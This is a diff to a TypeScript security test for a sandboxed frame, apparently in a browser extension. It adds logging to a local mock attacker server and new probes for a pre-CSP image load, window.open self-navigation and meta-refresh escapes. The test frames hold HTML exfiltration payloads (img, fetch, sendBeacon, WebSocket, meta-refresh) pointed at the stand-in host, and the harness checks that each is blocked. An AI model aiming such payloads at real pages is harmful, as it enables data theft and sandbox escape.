@@ -33,6 +33,7 @@ const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));
 // ── the attacker host (port B): counts every request it receives. If a frame
 //    can exfiltrate over the network, these counters move.
 let attackerRequests = 0;
+let attackerPaths: string[] = [];
 function attackerServer(): Promise<{ url: string; requests: () => number; close: () => Promise<void> }> {
   return new Promise((resolve) => {
     const ac = new AbortController();
@@ -40,10 +41,12 @@ function attackerServer(): Promise<{ url: string; requests: () => number; close:
       resolve({
         url: `http://127.0.0.1:${port}`,
         requests: () => attackerRequests,
+        paths: () => attackerPaths,
         close: async () => { ac.abort(); await server.shutdown(); },
       });
     } }, async () => {
       attackerRequests++;
+      try { attackerPaths.push(new URL(req.url).pathname); } catch { attackerPaths.push(String(req.url)); }
       return new Response("leaked", { headers: { "access-control-allow-origin": "*" } });
     });
   });
@@ -102,6 +105,24 @@ const frames = {
   exfil: [
     '<img src="' + host + '/leak-img?d=secret">',
     '<script>fetch("' + host + '/leak-fetch").catch(()=>{}); navigator.sendBeacon("' + host + '/leak-beacon"); try{new WebSocket("ws://127.0.0.1:9/leak-ws");}catch(e){}<\\/script>',
+  ].join(""),
+  // CRITICAL regression probes (sol): the pre-head load + self-navigation +
+  // meta-refresh escapes. Each must be BLOCKED (no request reaches the attacker).
+  'prehead': [
+    // An <img> BEFORE any <head> — must not load (the CSP is prepended first).
+    '<img src="' + host + '/pre-csp-image">',
+    '<head><title>x</title></head>',
+  ].join(""),
+  'selfnav': [
+    // Self-navigation. The in-frame navigation guard blocks window.open + link/
+    // form navigation (the location object is unforgeable, so location.href is
+    // closed by the extension-level declarativeNetRequest rule — verified in the
+    // extension journeys). Here we verify the guard's window.open block.
+    '<script>try{var w=window.open("' + host + '/self-window-open");}catch(e){}<\\/script>',
+  ].join(""),
+  'metarefresh': [
+    // A meta-refresh navigation — must be stripped (never reaches the attacker).
+    '<meta http-equiv="refresh" content="0;url=' + host + '/meta-refresh">',
   ].join(""),
   escape: [
     '<script>',
@@ -186,7 +207,7 @@ async function main() {
 
     // 1. NETWORK EXFIL — did any request reach the attacker host?
     const n = attacker.requests();
-    check("network exfil: no request escaped the sandbox", n === 0, { attackerRequests: n });
+    check("network exfil: no request escaped the sandbox", n === 0, { attackerRequests: n, paths: (attacker as any).paths?.() });
 
     // 2 + 3. The escape frame's observations (reported via postMessage).
     const results = await evl(s.sessionId, `window.__securityResults ?? []`);
